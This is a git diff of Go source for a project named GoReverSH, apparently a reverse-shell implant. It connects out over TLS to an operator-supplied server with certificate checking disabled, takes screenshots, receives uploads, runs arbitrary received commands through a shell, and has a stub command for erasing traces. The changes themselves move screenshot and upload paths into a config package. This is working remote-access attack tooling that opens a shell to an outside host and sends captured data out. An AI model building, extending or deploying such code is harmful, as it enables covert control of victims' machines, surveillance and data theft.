@@ -1,6 +1,7 @@
 package main
 
 import (
+	"GoReverSH/config"
 	"GoReverSH/utils"
 	"bytes"
 	"crypto/rand"
@@ -74,7 +75,13 @@ func getscreenshot() ([]string, error) {
 				fpth = `/tmp/`
 			}
 		*/
-		fpth = "./screenshot/"
+		//fpth = "./screenshot/"
+		fpth = config.Config.ScreenshotDir
+		if _, err := os.Stat(fpth); os.IsNotExist(err) {
+			if err2 := os.MkdirAll(fpth, 0755); err2 != nil {
+				log.Fatalf("Could not create the path %s", fpth)
+			}
+		}
 		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
 		fullpath := fpth + fileName
 		filenames = append(filenames, fullpath)
@@ -117,7 +124,8 @@ func runShell(conn net.Conn) {
 		case "upload":
 			filePath := strings.Split(commands[len(commands)-1], "/")
 			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
-			dir := "upload/"
+			//dir := "upload/"
+			dir := config.Config.UploadDIr
 			if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
 				if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
 					log.Fatalf("Could not create the path %s", dir)
@@ -311,8 +319,9 @@ func runShell(conn net.Conn) {
 				log.Println(err)
 			}
 
-		case "clean": //痕跡消去 ex: clean_go_reversh
-		//tips/main11.goを参考
+		case "clean_go_reversh": //痕跡消去 ex: clean_go_reversh
+			//tips/main11.goを参考
+			fmt.Println("CLEAN")
 
 		default:
 			var cmd *exec.Cmd
@@ -369,7 +378,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("Loadkeys : %s", err)
 	}
-	config := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
+	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	//config := &tls.Config{InsecureSkipVerify: true}
 
 	server := flag.String("server", "", "target ipaddr")
@@ -377,12 +386,15 @@ func main() {
 	flag.Parse()
 
 	//fmt.Println(*server, *port)
-	conn, err := tls.Dial("tcp", net.JoinHostPort(*server, *port), config)
+	conn, err := tls.Dial("tcp", net.JoinHostPort(*server, *port), tlsConfig)
 	if err != nil {
 		log.Fatalf("Client dial error: %s", err)
 	}
 	defer fmt.Println("Cleanup")
 	defer conn.Close()
+
+	config.InitConfig()
+	fmt.Println(config.Config)
 
 	//クライアント名を作成
 	//hostName, _ := os.Hostname() //develop
